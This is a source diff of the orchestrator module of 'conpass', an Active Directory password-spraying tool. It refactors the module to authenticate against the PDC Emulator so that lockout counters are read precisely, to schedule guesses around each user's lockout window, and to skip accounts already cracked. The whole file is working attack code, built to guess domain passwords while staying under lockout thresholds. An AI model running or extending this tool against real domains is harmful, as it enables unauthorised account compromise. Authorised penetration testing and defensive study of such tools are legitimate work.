@@ -1,10 +1,8 @@
 """Password spray orchestrator - coordinates the spray operation."""
 
-import queue
 import signal
 import threading
 import time
-from pathlib import Path
 
 from rich.console import Console
 from rich.progress import (
@@ -12,16 +10,21 @@ from rich.progress import (
     MofNCompleteColumn,
     Progress,
     TaskProgressColumn,
+    TextColumn,
 )
+from rich.prompt import Confirm
 from rich.table import Table
 
 from conpass.config import SprayConfig
-from conpass.core.worker import Worker, WorkItem
+from conpass.core.scheduler import Scheduler
+from conpass.core.worker import Worker, WorkerContext
+from conpass.exceptions import PdcNotFoundError
 from conpass.models import Credentials, PasswordPolicy, User
 from conpass.services.database import DatabaseService
 from conpass.services.ldap import LdapService
 from conpass.services.policy import PolicyService
 from conpass.services.smb import SmbService
+from conpass.utils import find_pdc_hostname, resolve_hostname
 
 
 class SprayOrchestrator:
@@ -44,6 +47,7 @@ class SprayOrchestrator:
         self.time_delta = None
         self.dc_host = None
         self.dc_ip = None
+        self.pdc_ip = None
 
         # Spray state
         self.users: list[User] = []
@@ -51,15 +55,12 @@ class SprayOrchestrator:
         self.psos: list[PasswordPolicy] = []
 
         # Threading
-        self.work_queue: queue.Queue = queue.Queue(maxsize=100 if config.limit_memory else 0)
+        self.scheduler: Scheduler | None = None
         self.workers: list[Worker] = []
         self.stop_event = threading.Event()
         self.lockout_event = threading.Event()
-
-        # Progress tracking
-        self.completed_count = 0
-        self.completed_lock = threading.Lock()
         self.connected_workers = 0
+        self.failed_workers = 0
         self.connected_workers_lock = threading.Lock()
 
         # Setup signal handlers
@@ -97,191 +98,169 @@ class SprayOrchestrator:
 
         # Get DC details
         if not self.config.dc_ip:
-            if self.config.debug:
-                self.console.print(f"[cyan][DEBUG] Resolving DC details for domain: {self.config.domain}[/cyan]")
+            self._debug(f"Resolving DC details for domain: {self.config.domain}")
             self.dc_host, self.dc_ip = SmbService.get_dc_details(self.config.domain, self.config.dns_ip)
-            if self.config.debug:
-                self.console.print(f"[cyan][DEBUG] Resolved DC: {self.dc_host} ({self.dc_ip})[/cyan]")
         else:
             self.dc_ip = self.config.dc_ip
             self.dc_host = self.config.dc_host or self.dc_ip
-            if self.config.debug:
-                self.console.print(f"[cyan][DEBUG] Using provided DC: {self.dc_host} ({self.dc_ip})[/cyan]")
-
-        # Get time delta
-        if self.config.debug:
-            self.console.print(f"[cyan][DEBUG] Getting time delta with DC: {self.dc_ip}[/cyan]")
-        self.time_delta = SmbService.get_time_delta(self.dc_ip)
-        self.console.print(
-            f"Time difference with '{self.dc_host}' ({self.dc_ip}): "
-            f"{self.time_delta.total_seconds()} seconds"
-        )
+        self._debug(f"Using DC: {self.dc_host} ({self.dc_ip})")
 
         # Initialize database service if configured
         if self.config.use_database:
-            if self.config.debug:
-                self.console.print(f"[cyan][DEBUG] Initializing database: {self.config.database_path}[/cyan]")
+            self._debug(f"Initializing database: {self.config.database_path}")
             self.database_service = DatabaseService(self.config.database_path, self.config.domain)
             self.database_service.connect()
 
-            # Display database statistics
             stats = self.database_service.get_stats()
             self.console.print(
                 f"[cyan]Database statistics: {stats['total']} tests recorded "
                 f"({stats['successful']} successful, {stats['failed']} failed)[/cyan]"
             )
-            if stats['successful'] > 0:
-                successful_creds = self.database_service.get_successful_credentials()
-                self.console.print(f"[green]Found {len(successful_creds)} previously successful credentials in database[/green]")
 
         if self.config.is_online_mode:
-            if self.config.debug:
-                self.console.print("[cyan][DEBUG] Running in online mode (with LDAP)[/cyan]")
             self._gather_online_mode()
         else:
-            if self.config.debug:
-                self.console.print("[cyan][DEBUG] Running in offline mode (no LDAP)[/cyan]")
             self._gather_offline_mode()
 
-    def _gather_online_mode(self) -> None:
-        """Gather information in online mode (with LDAP access)."""
-        # Create LDAP service
+        self._exclude_already_found()
+        self.console.print(f"[bold green]Total sprayed users: {len(self.users)}[/bold green]")
+
+    def _debug(self, message: str) -> None:
         if self.config.debug:
-            self.console.print(f"[cyan][DEBUG] Creating LDAP service (base_dn={self.config.base_dn}, use_ssl={self.config.use_ssl})[/cyan]")
-        self.ldap_service = LdapService(
+            self.console.print(f"[cyan][DEBUG] {message}[/cyan]")
+
+    def _measure_time_delta(self) -> None:
+        """badPasswordTime and lockoutTime are written with the PDC clock: sync on it."""
+        self.time_delta = SmbService.get_time_delta(self.pdc_ip)
+        self.console.print(
+            f"Time difference with PDC ({self.pdc_ip}): {self.time_delta.total_seconds()} seconds"
+        )
+
+    def _locate_pdc(self) -> None:
+        """
+        Find the PDC Emulator: badPwdCount is not replicated and only the PDC sees
+        every failure and decides the lockout. Authenticating directly against it
+        means our attempts only move the counter we read.
+        """
+        if self.ldap_service:
+            pdc_fqdn, pdc_ip = self.ldap_service.find_pdc_emulator()
+        else:
+            pdc_fqdn = find_pdc_hostname(self.config.domain, self.config.dns_ip or self.dc_ip)
+            pdc_ip = None
+            if pdc_fqdn:
+                try:
+                    pdc_ip = resolve_hostname(pdc_fqdn, self.config.dns_ip or self.dc_ip)
+                except OSError:
+                    pdc_ip = None
+
+        if pdc_ip:
+            self.pdc_ip = pdc_ip
+            self.console.print(f"[green]PDC Emulator identified: {pdc_fqdn} ({pdc_ip})[/green]")
+            return
+
+        self.pdc_ip = self.dc_ip
+        self.console.print(
+            f"[yellow]Warning: could not identify the PDC Emulator, falling back to {self.dc_ip}. "
+            f"If it is not the PDC, attempts may be counted on DCs whose badPwdCount is never read, "
+            f"increasing the risk of account lockout.[/yellow]"
+        )
+        if not Confirm.ask(
+            "[yellow]Continue anyway despite the higher lockout risk?[/yellow]",
+            console=self.console,
+            default=False,
+        ):
+            raise PdcNotFoundError("Aborted: PDC Emulator could not be identified.")
+
+    def _new_ldap_service(self, dc_ip: str, console: Console | None, fetch_schema: bool) -> LdapService:
+        return LdapService(
             credentials=self.credentials,
             base_dn=self.config.base_dn,
-            dc_ip=self.dc_ip,
+            dc_ip=dc_ip,
             use_ssl=self.config.use_ssl,
             page_size=self.config.ldap_page_size,
             timeout=self.config.timeout,
             dns_ip=self.config.dns_ip,
-            console=self.console,
-            debug=self.config.debug
+            console=console,
+            debug=self.config.debug and console is not None,
+            fetch_schema=fetch_schema,
         )
 
-        # Connect to all DCs
-        if self.config.debug:
-            self.console.print(f"[cyan][DEBUG] Connecting to all Domain Controllers via LDAP[/cyan]")
+    def _gather_online_mode(self) -> None:
+        """Gather information in online mode (with LDAP access)."""
+        self.ldap_service = self._new_ldap_service(self.dc_ip, self.console, fetch_schema=True)
         self.ldap_service.connect()
-        all_dc_ips = self.ldap_service.get_dc_ips()
-        self.console.print(
-            f"Successfully connected to Domain Controllers {all_dc_ips} via LDAP"
-        )
+        self._locate_pdc()
+        if self.pdc_ip != self.dc_ip:
+            self.ldap_service.close()
+            self.ldap_service = self._new_ldap_service(self.pdc_ip, self.console, fetch_schema=True)
+            self.ldap_service.connect()
+        self.console.print(f"Successfully connected to the PDC Emulator ({self.pdc_ip}) via LDAP")
+        self._measure_time_delta()
 
-        # Create policy service
-        if self.config.debug:
-            self.console.print(f"[cyan][DEBUG] Creating policy service (security_threshold={self.config.security_threshold})[/cyan]")
         self.policy_service = PolicyService(
             ldap_service=self.ldap_service,
             security_threshold=self.config.security_threshold,
             time_delta=self.time_delta,
             console=self.console
         )
-
-        # Load policies
-        if self.config.debug:
-            self.console.print(f"[cyan][DEBUG] Loading password policies from LDAP[/cyan]")
         self.policy_service.load_policies()
         self.default_policy = self.policy_service.get_default_policy()
         self.psos = self.policy_service.get_psos()
 
-        if self.config.debug:
-            self.console.print(f"[cyan][DEBUG] Loaded default policy: lockout_threshold={self.default_policy.lockout_threshold}, "
-                             f"lockout_window={self.default_policy.lockout_window_seconds}s[/cyan]")
-            if self.psos:
-                self.console.print(f"[cyan][DEBUG] Loaded {len(self.psos)} PSO(s)[/cyan]")
-                for pso in self.psos:
-                    self.console.print(f"[cyan][DEBUG]   - {pso.name}: lockout_threshold={pso.lockout_threshold}, "
-                                     f"lockout_window={pso.lockout_window_seconds}s[/cyan]")
-
-        # Build user list
         user_filter = self._read_user_file() if self.config.user_file else None
-        if self.config.debug:
-            if user_filter:
-                self.console.print(f"[cyan][DEBUG] Using user filter from file: {len(user_filter)} user(s)[/cyan]")
-            else:
-                self.console.print(f"[cyan][DEBUG] Building user list from LDAP (no user filter)[/cyan]")
         self.users = self.policy_service.build_user_list(user_filter)
-
-        # Display policies
         self._display_policies()
-
-        # Display user count
-        self.console.print(f"[bold green]Total sprayed users: {len(self.users)}[/bold green]")
-        if self.config.debug:
-            policies_distribution = {}
-            for user in self.users:
-                policy_name = user.policy.name
-                policies_distribution[policy_name] = policies_distribution.get(policy_name, 0) + 1
-            self.console.print(f"[cyan][DEBUG] User distribution by policy:[/cyan]")
-            for policy_name, count in policies_distribution.items():
-                self.console.print(f"[cyan][DEBUG]   - {policy_name}: {count} user(s)[/cyan]")
 
     def _gather_offline_mode(self) -> None:
         """Gather information in offline mode (no LDAP access)."""
-        from datetime import datetime, timezone
-
         self.console.print(
             "[yellow]Building users list based on provided password policy. "
             "No online checks will be made.[/yellow]"
         )
+        self._locate_pdc()
+        self._measure_time_delta()
 
-        # Create manual policy
-        if self.config.debug:
-            self.console.print(f"[cyan][DEBUG] Creating manual policy (lockout_threshold={self.config.manual_lockout_threshold}, "
-                             f"lockout_window={self.config.manual_lockout_observation_window}s)[/cyan]")
         self.default_policy = PasswordPolicy(
             name="Manual Domain Policy",
             lockout_threshold=self.config.manual_lockout_threshold,
             lockout_window_seconds=self.config.manual_lockout_observation_window
         )
 
-        # Display policy
         table = Table()
         table.add_column('Name')
         table.add_column('Lockout Threshold')
         table.add_column('Lockout Window (s)')
-        table.add_column('Lockout Duration (s)')
-        table.add_column('Min Pwd Length')
-        table.add_column('Pwd History')
-        table.add_column('Max Pwd Age (d)')
-        table.add_column('Min Pwd Age (d)')
-        table.add_column('Complexity')
         table.add_row(
             self.default_policy.name,
             str(self.default_policy.lockout_threshold),
             str(self.default_policy.lockout_window_seconds),
-            str(self.default_policy.lockout_duration_seconds),
-            str(self.default_policy.min_pwd_length),
-            str(self.default_policy.pwd_history_length),
-            str(self.default_policy.max_pwd_age_days),
-            str(self.default_policy.min_pwd_age_days),
-            "Yes" if self.default_policy.complexity_enabled else "No"
         )
         self.console.print(table)
-
-        # Build user list from file
-        if self.config.debug:
-            self.console.print(f"[cyan][DEBUG] Reading user list from file: {self.config.user_file}[/cyan]")
-        usernames = self._read_user_file()
-        if self.config.debug:
-            self.console.print(f"[cyan][DEBUG] Read {len(usernames)} user(s) from file[/cyan]")
 
         self.users = [
             User(
                 samaccountname=username,
                 dn=None,
                 policy=self.default_policy,
-                bad_password_count=0,
-                bad_password_time=datetime(1970, 1, 1, tzinfo=timezone.utc),
-                time_delta=self.time_delta,
                 security_threshold=self.config.security_threshold,
             )
-            for username in usernames
+            for username in self._read_user_file()
         ]
 
-        self.console.print(f"[bold green]Total sprayed users: {len(self.users)}[/bold green]")
+    def _exclude_already_found(self) -> None:
+        """Don't spray users whose password was found in a previous run."""
+        if not self.database_service:
+            return
+        found = {username.lower() for username, _ in self.database_service.get_successful_credentials()}
+        if not found:
+            return
+        before = len(self.users)
+        self.users = [user for user in self.users if user.samaccountname.lower() not in found]
+        if before != len(self.users):
+            self.console.print(
+                f"[green]{before - len(self.users)} user(s) skipped: password already found "
+                f"(conpass --show to display them)[/green]"
+            )
 
     def _display_policies(self) -> None:
         """Display password policies in a table."""
@@ -355,72 +334,72 @@ class SprayOrchestrator:
         """Start the password spraying operation."""
         self.console.rule('Password Spraying')
 
-        # Start workers
+        is_tested = None
+        if self.database_service:
+            db = self.database_service
+            is_tested = lambda user, password: db.is_already_tested(user.samaccountname, password)  # noqa: E731
+        self.scheduler = Scheduler(self.users, is_tested)
+
         self._start_workers()
+        if not self._wait_for_workers_connection():
+            return
 
-        # Wait for all workers to connect
-        self._wait_for_workers_connection()
+        try:
+            self._spray_loop()
+        finally:
+            self.scheduler.close()
+            self.stop_event.set()
+            for worker in self.workers:
+                worker.join(timeout=5)
 
-        # Feed work queue with passwords
-        self._feed_work_queue()
-
-        # Wait for completion
-        self.work_queue.join()
-
-        # Stop workers
-        self.stop_event.set()
-        for worker in self.workers:
-            worker.join(timeout=1)
+        if self.lockout_event.is_set():
+            self.console.print("[red bold]Spray aborted: an account lockout was detected.[/red bold]")
 
     def _start_workers(self) -> None:
-        """Start worker threads."""
+        """Start worker threads, each with its own LDAP and SMB connection to the PDC."""
+        context = WorkerContext(
+            console=self.console,
+            domain=self.config.domain,
+            pdc_ip=self.pdc_ip,
+            time_delta=self.time_delta,
+            stop_event=self.stop_event,
+            lockout_event=self.lockout_event,
+            database_service=self.database_service,
+            debug=self.config.debug,
+        )
         for i in range(self.config.max_threads):
-            # Create services for this worker
             ldap_service = None
             if self.config.is_online_mode:
-                ldap_service = LdapService(
-                    credentials=self.credentials,
-                    base_dn=self.config.base_dn,
-                    dc_ip=self.dc_ip,
-                    use_ssl=self.config.use_ssl,
-                    page_size=self.config.ldap_page_size,
-                    timeout=self.config.timeout,
-                    dns_ip=self.config.dns_ip,
-                    console=None,  # Don't pass console to workers to avoid display conflicts
-                    debug=False  # Don't pass debug to workers to avoid display conflicts
-                )
-
+                ldap_service = self._new_ldap_service(self.pdc_ip, console=None, fetch_schema=False)
             smb_service = SmbService(
-                dc_ip=self.dc_ip,
+                dc_ip=self.pdc_ip,
                 domain=self.config.domain,
-                console=self.console
+                console=self.console,
+                timeout=max(self.config.timeout, 10),
             )
-
-            # Create worker
             worker = Worker(
                 worker_id=i + 1,
-                work_queue=self.work_queue,
+                scheduler=self.scheduler,
                 ldap_service=ldap_service,
                 smb_service=smb_service,
-                console=self.console,
-                online_mode=self.config.is_online_mode,
-                stop_event=self.stop_event,
-                lockout_event=self.lockout_event,
-                database_service=self.database_service,
-                completed_count_ref=(self, 'completed_count', 'completed_lock'),
-                connected_workers_ref=(self, 'connected_workers', 'connected_workers_lock'),
-                debug=self.config.debug
+                context=context,
+                on_connected=self._on_worker_connected,
             )
-
             worker.start()
             self.workers.append(worker)
 
-    def _wait_for_workers_connection(self) -> None:
-        """Wait for all workers to connect with a progress bar."""
-        from rich.progress import Progress, BarColumn, MofNCompleteColumn, TextColumn
+    def _on_worker_connected(self, success: bool) -> None:
+        with self.connected_workers_lock:
+            if success:
+                self.connected_workers += 1
+            else:
+                self.failed_workers += 1
+
+    def _wait_for_workers_connection(self) -> bool:
+        """Wait for all workers to connect with a progress bar. False if none could."""
+        from rich.progress import TextColumn
 
         total_workers = len(self.workers)
-
         with Progress(
             TextColumn("[progress.description]{task.description}"),
             BarColumn(),
@@ -429,132 +408,69 @@ class SprayOrchestrator:
             transient=True
         ) as progress:
             task = progress.add_task("Connecting workers...", total=total_workers)
-
             while True:
                 with self.connected_workers_lock:
-                    connected = self.connected_workers
-
+                    connected, failed = self.connected_workers, self.failed_workers
                 progress.update(task, completed=connected)
-
-                if connected >= total_workers:
+                if connected + failed >= total_workers:
                     break
-
                 time.sleep(0.1)
 
-        self.console.print(f"[green]✓ All {total_workers} workers connected")
+        if connected == 0:
+            self.console.print("[red]No worker could connect, aborting.[/red]")
+            return False
+        self.console.print(f"[green]✓ {connected}/{total_workers} workers connected")
+        return True
 
-    def _feed_work_queue(self) -> None:
-        """Read passwords from file and feed work queue, monitoring for new passwords."""
-        seen_passwords = set()
-        total_tests = 0
-        last_file_check = 0
+    def _spray_loop(self) -> None:
+        """Feed the scheduler with passwords (watching the password file) until done."""
+        if self.config.user_as_pass:
+            for user in self.users:
+                self.scheduler.add_user_password(user, user.samaccountname)
 
-        # Monitor progress while workers are working
+        seen_passwords: set[str] = set()
+        last_file_check = 0.0
+        announced_idle = False
+
         with Progress(
             "[progress.description]{task.description}",
             BarColumn(),
             MofNCompleteColumn(),
             TaskProgressColumn(),
+            TextColumn("[bright_black]{task.fields[waiting]}"),
             console=self.console
         ) as progress:
-            task = progress.add_task("Spraying passwords", total=total_tests)
+            task = progress.add_task("Spraying passwords", total=0, waiting="")
 
-            # Add user-as-pass tests if enabled
-            if self.config.user_as_pass:
-                added_tests = 0
-                skipped_tests = 0
-                for user in self.users:
-                    if self.stop_event.is_set() or self.lockout_event.is_set():
-                        break
-
-                    password = user.samaccountname
-
-                    # Skip if already tested in database (but count it as completed)
-                    if self.database_service and self.database_service.is_already_tested(user.samaccountname, password):
-                        skipped_tests += 1
-                        # Increment completed count for already-tested credentials
-                        with self.completed_lock:
-                            self.completed_count += 1
-                        if self.config.debug:
-                            was_successful = self.database_service.was_successful(user.samaccountname, password)
-                            status_str = "SUCCESS" if was_successful else "FAILED"
-                            self.console.print(f"[bright_black]⊘ Skipping {user.samaccountname}/{password} - already tested ({status_str})[/bright_black]")
-                        continue
-
-                    work_item = WorkItem(user=user, password=password)
-                    self.work_queue.put(work_item)
-                    seen_passwords.add(password)
-                    added_tests += 1
-
-                # Total = all tests (added + skipped)
-                total_tests = added_tests + skipped_tests
-                progress.update(task, total=total_tests)
-                if skipped_tests > 0:
-                    self.console.print(f"[cyan]Added {added_tests} user-as-pass tests, {skipped_tests} already completed (total: {total_tests})[/cyan]")
-                else:
-                    self.console.print(f"[cyan]Added user-as-pass tests, total tests: {total_tests}[/cyan]")
-
-            while any(w.is_alive() for w in self.workers):
-                if self.stop_event.is_set() or self.lockout_event.is_set():
+            while not self.stop_event.is_set() and not self.lockout_event.is_set():
+                if not any(w.is_alive() for w in self.workers):
                     break
 
-                # Check for new passwords every second if password file exists
-                if self.config.password_file:
-                    current_time = time.time()
-                    if current_time - last_file_check >= 1.0:
-                        last_file_check = current_time
-                        new_passwords = self._read_new_passwords(seen_passwords)
+                if self.config.password_file and time.monotonic() - last_file_check >= 1.0:
+                    last_file_check = time.monotonic()
+                    new_passwords = self._read_new_passwords(seen_passwords)
+                    if new_passwords:
+                        seen_passwords.update(new_passwords)
+                        self.scheduler.add_passwords(new_passwords)
+                        announced_idle = False
+                        self.console.print(f"[cyan]Added {len(new_passwords)} new password(s)[/cyan]")
 
-                        if new_passwords:
-                            # Add new passwords to queue
-                            added_per_password = {}
-                            for password in new_passwords:
-                                if self.stop_event.is_set() or self.lockout_event.is_set():
-                                    break
+                completed, total = self.scheduler.progress()
+                waiting = self.scheduler.waiting_count()
+                progress.update(
+                    task, completed=completed, total=total,
+                    waiting=f"{waiting} user(s) waiting for their lockout window" if waiting else "",
+                )
 
-                                added_for_this_pwd = 0
-                                skipped_for_this_pwd = 0
-                                for user in self.users:
-                                    if self.stop_event.is_set() or self.lockout_event.is_set():
-                                        break
-
-                                    # Skip if already tested in database (but count it as completed)
-                                    if self.database_service and self.database_service.is_already_tested(user.samaccountname, password):
-                                        skipped_for_this_pwd += 1
-                                        # Increment completed count for already-tested credentials
-                                        with self.completed_lock:
-                                            self.completed_count += 1
-                                        continue
-
-                                    work_item = WorkItem(user=user, password=password)
-                                    self.work_queue.put(work_item)
-                                    added_for_this_pwd += 1
-
-                                seen_passwords.add(password)
-                                added_per_password[password] = (added_for_this_pwd, skipped_for_this_pwd)
-                                # Total includes both added and skipped tests
-                                total_tests += added_for_this_pwd + skipped_for_this_pwd
-
-                            # Update progress bar with new total
-                            progress.update(task, total=total_tests)
-                            total_skipped = sum(skipped for _, skipped in added_per_password.values())
-                            total_added = sum(added for added, _ in added_per_password.values())
-                            if total_skipped > 0:
-                                self.console.print(f"[cyan]Added {len(new_passwords)} new password(s): {total_added} tests queued, {total_skipped} already completed (total: {total_tests})[/cyan]")
-                            else:
-                                self.console.print(f"[cyan]Added {len(new_passwords)} new password(s), total tests: {total_tests}[/cyan]")
-                else:
-                    # No password file - check if all work is done
-                    if self.work_queue.empty():
-                        with self.completed_lock:
-                            if self.completed_count >= total_tests:
-                                # All work is done, stop workers
-                                break
-
-                # Update completed count
-                with self.completed_lock:
-                    completed = self.completed_count
-                progress.update(task, completed=completed)
+                if self.scheduler.is_done():
+                    if not self.config.password_file:
+                        break
+                    if not announced_idle:
+                        announced_idle = True
+                        self.console.print(
+                            "[green]All passwords tested. Watching the password file for new ones "
+                            "(Ctrl+C to quit)[/green]"
+                        )
 
                 time.sleep(0.5)
 
@@ -568,7 +484,7 @@ class SprayOrchestrator:
             with open(self.config.password_file) as f:
                 for line in f:
                     password = line.strip()
-                    if password and not password.isspace() and password not in seen_passwords:
+                    if password and password not in seen_passwords and password not in new_passwords:
                         new_passwords.append(password)
         except FileNotFoundError:
             # File might have been deleted, ignore
